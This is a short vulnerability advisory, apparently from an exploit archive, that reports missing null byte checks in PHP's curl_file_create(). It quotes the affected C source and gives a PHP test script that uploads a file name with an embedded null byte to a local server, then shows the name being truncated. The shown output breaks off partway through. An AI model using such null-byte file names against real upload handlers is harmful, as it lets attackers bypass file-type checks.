@@ -1,0 +1,62 @@
+id: 26781
+date: 01/23/2017
+title: PHP 7.1.0 / 5.6.29 missing null byte checks for paths in curl_file_create() Vulnerability
+author: Maksymilian
+cves: 
+
+Description:
+------------
+Missing null byte checks for paths in curlfile_ctor()
+curl_file_create() doesn’t ensure that pathnames lack NULL byte, which might allow attacker to manipulate the upload file name and path.
+
+Affected code:
+==================================
+static void curlfile_ctor(INTERNAL_FUNCTION_PARAMETERS)
+{
+char *fname = NULL, *mime = NULL, *postname = NULL;
+size_t fname_len, mime_len, postname_len;
+zval *cf = return_value;
+
+if (zend_parse_parameters(ZEND_NUM_ARGS(), "s|ss", &fname, &fname_len, &mime, &mime_len, &postname, &postname_len) == FAILURE) { ⇐====
+return;
+}
+==================================
+
+
+Affected function:
+==================================
+CURLFile curl_file_create ( string $filename [, string $mimetype [, string $postname ]] )
+==================================
+
+type of parameters filename to change. From a security perspective, You may consider changing the type of parameter postname
+
+Test script:
+---------------
+<?php
+
+$request = curl_init('http://127.0.0.1/print.php');
+
+curl_setopt($request, CURLOPT_POST, true);
+
+$args['file'] = curl_file_create("./test.test\0.file.to.send.png", "image/png", "test.test\0.file.to.send.png");
+curl_setopt($request, CURLOPT_POSTFIELDS, $args);
+
+echo curl_exec($request);
+curl_close($request);
+
+
+Expected result:
+----------------
+warning
+
+Actual result:
+--------------
+uploaded test.test and name
+
+Array
+(
+[file] => Array
+(
+[name] => test.test
+
+#  0day.today [2023-03-25]  #
